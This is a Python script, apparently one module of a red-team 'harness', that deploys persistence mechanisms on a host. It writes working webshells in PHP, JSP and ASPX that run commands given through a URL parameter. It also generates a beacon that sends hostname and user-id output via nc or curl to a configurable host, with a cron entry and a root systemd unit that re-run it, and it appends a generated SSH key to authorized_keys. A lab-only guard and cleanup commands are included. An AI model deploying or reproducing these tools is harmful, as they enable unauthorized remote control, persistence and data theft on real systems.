#!/usr/bin/env python3
# HARNESS-VALIDATION v2.7.0 — persistence deployment (LAB ONLY).
# Phase 4 (persistence) — déploiement multi-vectoriel pour validation lab.
#   - v2.7 : nouveau module Phase 4 — comble le gap persistence du harness
#   - LAB=1 OBLIGATOIRE — refuse de s'exécuter sans confirmation environnement lab
#   - Vecteurs : webshell (PHP + variants JSP/ASPX), cron, clé SSH, service systemd
#   - Tout est écrit sous /tmp/harness_* — JAMAIS dans /etc (lab-safe, ephemeral)
#   - Le service systemd est GÉNÉRÉ mais NON installé (instructions fournies)
#   - Cron écrit dans /tmp/harness_cron — NON installé (opérateur installe via `crontab`)
#   - Cleanup instructions incluses dans la sortie JSON pour chaque mécanisme
#   - Usage : python3 persistence_module.py <webshell|cron|ssh_key|systemd|all>
import json
import os
import shutil
import subprocess
import sys
from pathlib import Path

HARNESS_VERSION = "2.7.0"
MODULE_NAME = "persistence"

VALID_TYPES = ("webshell", "cron", "ssh_key", "systemd", "all")

# ─── Default deploy paths (all under /tmp — lab-safe, ephemeral) ────
WEBSHELL_PHP = "/tmp/harness_webshell.php"
WEBSHELL_JSP = "/tmp/harness_webshell.jsp"
WEBSHELL_ASPX = "/tmp/harness_webshell.aspx"
CRON_FILE = "/tmp/harness_cron"
BEACON_SCRIPT = "/tmp/harness_beacon.sh"
SSH_KEY_PATH = "/tmp/harness_key"
SYSTEMD_SERVICE = "/tmp/harness_persist.service"

# Beacon C2 target — loopback only by default (lab). Configurable via env.
BEACON_HOST = os.environ.get("BEACON_HOST", "127.0.0.1")
BEACON_PORT = os.environ.get("BEACON_PORT", "4444")

# ─── Webshell payloads ──────────────────────────────────────────────
# PHP (primary — deployed & documented). Minimal command executor via ?c=
PHP_WEBSHELL = '<?php if(isset($_GET["c"])){system($_GET["c"]);} ?>'

# JSP variant (documentation — written to .jsp, not deployed to a container).
JSP_WEBSHELL = (
    '<%@ page import="java.io.*" %><%'
    ' String c=request.getParameter("c");'
    ' if(c!=null){'
    '  Process p=Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",c});'
    '  BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));'
    '  String l; while((l=br.readLine())!=null){ out.println(l); }'
    ' }'
    ' %>'
)

# ASPX variant (documentation — written to .aspx, not deployed to IIS).
ASPX_WEBSHELL = (
    '<%@ Page Language="C#" %><%'
    ' string c=Request["c"];'
    ' if(c!=null){'
    '  var p=new System.Diagnostics.Process();'
    '  p.StartInfo.FileName="/bin/sh";'
    '  p.StartInfo.Arguments="-c "+c;'
    '  p.StartInfo.UseShellExecute=false;'
    '  p.StartInfo.RedirectStandardOutput=true;'
    '  p.Start();'
    '  Response.Write("<pre>"+p.StandardOutput.ReadToEnd()+"</pre>");'
    ' }'
    ' %>'
)

# ─── Beacon script (single-shot — cron re-invokes every 5 min) ──────
BEACON_CONTENT = (
    "#!/bin/sh\n"
    "# HARNESS-VALIDATION v2.7.0 lab beacon — single-shot callback.\n"
    "# Invoked every 5 min by /tmp/harness_cron. Loopback only.\n"
    "# Tries nc first, falls back to curl. Neither is installed in the target\n"
    "# permanently — beacon is self-contained and removable via cleanup.\n"
    f'PAYLOAD="harness beacon host=$(hostname 2>/dev/null) id=$(id 2>/dev/null) ts=$(date -u +%FT%TZ)"\n'
    f'echo "$PAYLOAD" | nc -w 3 {BEACON_HOST} {BEACON_PORT} 2>/dev/null '
    f'|| curl -s -m 3 --data-urlencode "p=$PAYLOAD" http://{BEACON_HOST}:{BEACON_PORT}/ 2>/dev/null '
    f'|| true\n'
)

# ─── Cron entry (written to /tmp — operator installs via `crontab`) ─
CRON_CONTENT = (
    f"# HARNESS-VALIDATION v2.7.0 lab cron — written to {CRON_FILE} (NOT system crontab).\n"
    f"# Install in lab only:  crontab {CRON_FILE}\n"
    f"*/5 * * * * {BEACON_SCRIPT}\n"
)

# ─── systemd unit (generated, NOT installed — instructions only) ───
SYSTEMD_CONTENT = (
    "[Unit]\n"
    "Description=HARNESS-VALIDATION v2.7.0 lab persistence beacon (TEST ONLY)\n"
    f"Documentation=file://{BEACON_SCRIPT}\n"
    "After=network.target\n"
    "\n"
    "[Service]\n"
    "Type=simple\n"
    f"ExecStart={BEACON_SCRIPT}\n"
    "Restart=always\n"
    "RestartSec=5\n"
    "# Run as root in lab (typical persistence target). Change User= for non-root.\n"
    "User=root\n"
    "\n"
    "[Install]\n"
    "WantedBy=multi-user.target\n"
)

# ─── Cleanup instructions (emitted in every run) ───────────────────
CLEANUP_COMMANDS = [
    "rm -f /tmp/harness_webshell.php /tmp/harness_webshell.jsp /tmp/harness_webshell.aspx",
    "rm -f /tmp/harness_cron /tmp/harness_beacon.sh",
    "rm -f /tmp/harness_key /tmp/harness_key.pub",
    "rm -f /tmp/harness_persist.service",
    "sed -i '/harness-lab-persist/d' ~/.ssh/authorized_keys 2>/dev/null || true",
    "crontab -r 2>/dev/null || true   # only if you ran `crontab /tmp/harness_cron`",
    "sudo systemctl stop harness_persist 2>/dev/null || true",
    "sudo systemctl disable harness_persist 2>/dev/null || true",
    "sudo rm -f /etc/systemd/system/harness_persist.service 2>/dev/null || true",
    "sudo systemctl daemon-reload 2>/dev/null || true",
]


# ─── LAB guard ──────────────────────────────────────────────────────

def lab_guard() -> bool:
    """Refuse to run unless LAB=1 is set in the environment."""
    return os.environ.get("LAB") == "1"


# ─── Deployers ──────────────────────────────────────────────────────

def deploy_webshell() -> dict:
    """Deploy PHP webshell + write JSP/ASPX documentation variants."""
    # PHP (primary)
    Path(WEBSHELL_PHP).write_text(PHP_WEBSHELL)
    os.chmod(WEBSHELL_PHP, 0o644)
    # JSP variant (documentation)
    Path(WEBSHELL_JSP).write_text(JSP_WEBSHELL)
    os.chmod(WEBSHELL_JSP, 0o644)
    # ASPX variant (documentation)
    Path(WEBSHELL_ASPX).write_text(ASPX_WEBSHELL)
    os.chmod(WEBSHELL_ASPX, 0o644)
    return {
        "type": "webshell",
        "path": WEBSHELL_PHP,
        "variants": {"php": WEBSHELL_PHP, "jsp": WEBSHELL_JSP, "aspx": WEBSHELL_ASPX},
        "url": "http://127.0.0.1:8080/tmp/harness_webshell.php?c=id",
        "note": "URL assumes webroot maps /tmp/ — adjust for the real docroot.",
    }


def deploy_cron() -> dict:
    """Write beacon script + cron entry under /tmp (NOT installed)."""
    # Beacon script (must be executable for cron to invoke it)
    Path(BEACON_SCRIPT).write_text(BEACON_CONTENT)
    os.chmod(BEACON_SCRIPT, 0o755)
    # Cron entry — operator installs via `crontab /tmp/harness_cron`
    Path(CRON_FILE).write_text(CRON_CONTENT)
    os.chmod(CRON_FILE, 0o644)
    return {
        "type": "cron",
        "file": CRON_FILE,
        "schedule": "*/5 * * * *",
        "beacon": BEACON_SCRIPT,
        "beacon_callback": f"{BEACON_HOST}:{BEACON_PORT}",
        "install_cmd": f"crontab {CRON_FILE}",
        "note": "Cron entry written to /tmp — NOT installed. Run install_cmd to activate.",
    }


def deploy_ssh_key() -> dict:
    """Generate ed25519 keypair; append pubkey to ~/.ssh/authorized_keys (idempotent)."""
    if not shutil.which("ssh-keygen"):
        return {"type": "ssh_key", "error": "ssh-keygen not in PATH"}
    # Idempotent: remove pre-existing key files before regenerating.
    for suffix in ("", ".pub"):
        try:
            os.remove(SSH_KEY_PATH + suffix)
        except FileNotFoundError:
            pass
    try:
        r = subprocess.run(
            ["ssh-keygen", "-t", "ed25519", "-f", SSH_KEY_PATH,
             "-N", "", "-C", "harness-lab-persist"],
            capture_output=True, text=True, timeout=15,
        )
    except subprocess.TimeoutExpired:
        return {"type": "ssh_key", "error": "ssh-keygen timed out"}
    if r.returncode != 0:
        return {"type": "ssh_key", "error": f"ssh-keygen exit={r.returncode}",
                "stderr": r.stderr[:200]}
    try:
        pub = Path(SSH_KEY_PATH + ".pub").read_text().strip()
    except FileNotFoundError:
        return {"type": "ssh_key", "error": "pubkey not generated"}
    # Ensure ~/.ssh exists (0700) and authorized_keys (0600).
    ssh_dir = Path(os.path.expanduser("~/.ssh"))
    ssh_dir.mkdir(mode=0o700, exist_ok=True)
    auth_keys = ssh_dir / "authorized_keys"
    marker = "harness-lab-persist"
    existing = ""
    if auth_keys.exists():
        try:
            existing = auth_keys.read_text(errors="replace")
        except OSError:
            existing = ""
    if marker in existing:
        status = "already_present"
    else:
        with auth_keys.open("a") as f:
            f.write(pub + "\n")
        status = "updated"
    try:
        os.chmod(ssh_dir, 0o700)
        os.chmod(auth_keys, 0o600)
    except OSError:
        pass
    return {
        "type": "ssh_key",
        "key": SSH_KEY_PATH,
        "pubkey": SSH_KEY_PATH + ".pub",
        "authorized_keys": status,
        "comment_marker": marker,
    }


def deploy_systemd() -> dict:
    """Generate systemd unit file (NOT installed — instructions only)."""
    Path(SYSTEMD_SERVICE).write_text(SYSTEMD_CONTENT)
    os.chmod(SYSTEMD_SERVICE, 0o644)
    return {
        "type": "systemd",
        "service_file": SYSTEMD_SERVICE,
        "install_cmd": (
            "sudo cp /tmp/harness_persist.service /etc/systemd/system/ && "
            "sudo systemctl daemon-reload && "
            "sudo systemctl enable --now harness_persist"
        ),
        "note": "Unit generated but NOT installed. Run install_cmd to activate in lab.",
    }


DEPLOYERS = {
    "webshell": deploy_webshell,
    "cron": deploy_cron,
    "ssh_key": deploy_ssh_key,
    "systemd": deploy_systemd,
}


# ─── Main ───────────────────────────────────────────────────────────

def main() -> None:
    # 1. LAB guard — refuse without explicit lab authorization.
    if not lab_guard():
        print(json.dumps({
            "module": MODULE_NAME,
            "harness_version": HARNESS_VERSION,
            "lab": False,
            "error": "LAB guard not satisfied",
            "detail": ("Set LAB=1 in the environment to confirm lab authorization. "
                       "This module deploys real persistence primitives and must NOT "
                       "run outside an isolated lab."),
            "legal_note": "Art. 323-1 Code pénal — persistence on unauthorized systems is illegal.",
        }, indent=2))
        sys.exit(1)

    # 2. Argument validation.
    ptype = sys.argv[1] if len(sys.argv) > 1 else None
    if ptype not in VALID_TYPES:
        print(json.dumps({
            "module": MODULE_NAME,
            "harness_version": HARNESS_VERSION,
            "lab": True,
            "error": "missing or invalid persistence type",
            "detail": f"argv[1] must be one of {list(VALID_TYPES)}",
            "received": ptype,
        }, indent=2))
        sys.exit(2)

    # 3. Deploy.
    deployed: list[dict] = []
    errors: list[str] = []
    if ptype == "all":
        for name in ("webshell", "cron", "ssh_key", "systemd"):
            try:
                deployed.append(DEPLOYERS[name]())
            except Exception as e:
                errors.append(f"{name}: {type(e).__name__}: {e}")
                deployed.append({"type": name, "error": str(e)})
    else:
        try:
            deployed.append(DEPLOYERS[ptype]())
        except Exception as e:
            errors.append(f"{ptype}: {type(e).__name__}: {e}")
            deployed.append({"type": ptype, "error": str(e)})

    report = {
        "module": MODULE_NAME,
        "harness_version": HARNESS_VERSION,
        "type": ptype,
        "lab": True,
        "beacon_callback": f"{BEACON_HOST}:{BEACON_PORT}",
        "deployed": deployed,
        "cleanup": CLEANUP_COMMANDS,
        "errors": errors,
    }
    print(json.dumps(report, indent=2))


if __name__ == "__main__":
    main()
